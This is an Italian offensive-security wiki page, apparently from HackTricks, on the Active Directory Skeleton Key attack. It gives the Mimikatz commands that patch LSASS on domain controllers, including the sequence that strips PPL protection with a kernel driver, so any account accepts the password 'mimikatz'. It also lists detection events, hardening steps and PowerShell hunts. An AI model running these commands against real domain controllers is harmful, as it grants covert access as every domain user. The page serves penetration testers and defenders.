# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

La **Skeleton Key attack** è una tecnica che consente agli attacker di **bypassare l'autenticazione di Active Directory** tramite l'**iniezione di una password master** nel processo LSASS di ogni domain controller. Dopo l'iniezione, la password master (predefinita: **`mimikatz`**) può essere utilizzata per autenticarsi come **qualsiasi utente del dominio**, mentre le loro password reali continuano a funzionare.<sup>[[1]](#references)[[2]](#references)</sup>

Informazioni chiave:

- Richiede **Domain Admin/SYSTEM + SeDebugPrivilege** su ogni DC e deve essere **riapplicata dopo ogni riavvio**.<sup>[[2]](#references)</sup>
- Applica patch ai percorsi di convalida **NTLM** e **Kerberos RC4 (etype 0x17)**; i realm che utilizzano solo AES o gli account che impongono AES **non accetteranno la skeleton key**.<sup>[[2]](#references)</sup>
- Può entrare in conflitto con pacchetti di autenticazione LSA di terze parti o con provider aggiuntivi per smart card / MFA.<sup>[[2]](#references)</sup>
- Il modulo Mimikatz accetta lo switch opzionale `/letaes` per evitare di modificare gli hook Kerberos/AES in caso di problemi di compatibilità.<sup>[[3]](#references)</sup>

### Execution

LSASS classico, non protetto da PPL:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Se **LSASS è in esecuzione come PPL** (RunAsPPL/Credential Guard/Windows 11 Secure LSASS), è necessario un driver del kernel per rimuovere la protezione prima di applicare patch a LSASS:<sup>[[3]](#references)</sup>
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Dopo l'injection, autenticati con qualsiasi account di dominio, ma usa la password `mimikatz` (o il valore impostato dall'operatore). Ricorda di ripetere l'operazione su **tutti i DC** negli ambienti con più DC.

## Mitigazioni

- **Monitoraggio dei log**
- **Event ID 7045** di sistema (installazione di servizi/driver) per driver non firmati come `mimidrv.sys`.
- **Sysmon**: Event ID 7 (caricamento del driver) per `mimidrv.sys`; Event ID 10 per accessi sospetti a `lsass.exe` da processi non di sistema.
- **Event ID 4673/4611** di sicurezza per l'uso di privilegi sensibili o anomalie nella registrazione dei pacchetti di autenticazione LSA; correlali con accessi 4624 imprevisti che utilizzano RC4 (etype 0x17) dai DC.
- **Hardening di LSASS**
- Mantieni **RunAsPPL/Credential Guard/Secure LSASS** abilitati sui DC per costringere gli attaccanti a eseguire il deployment di driver in modalità kernel (più telemetria, sfruttamento più difficile).
- Disabilita **RC4** legacy ove possibile; i ticket Kerberos limitati ad AES impediscono il percorso di hook RC4 utilizzato dallo skeleton key.<sup>[[2]](#references)</sup>
- Quick PowerShell hunts:
- Rileva le installazioni di driver kernel non firmati: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Cerca il driver di Mimikatz: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Verifica che PPL sia applicato dopo il riavvio: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Per ulteriori indicazioni sull'hardening delle credenziali, consulta [Windows credentials protections](../stealing-credentials/credentials-protections.md).

## References

- [1] [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [2] [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [3] [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
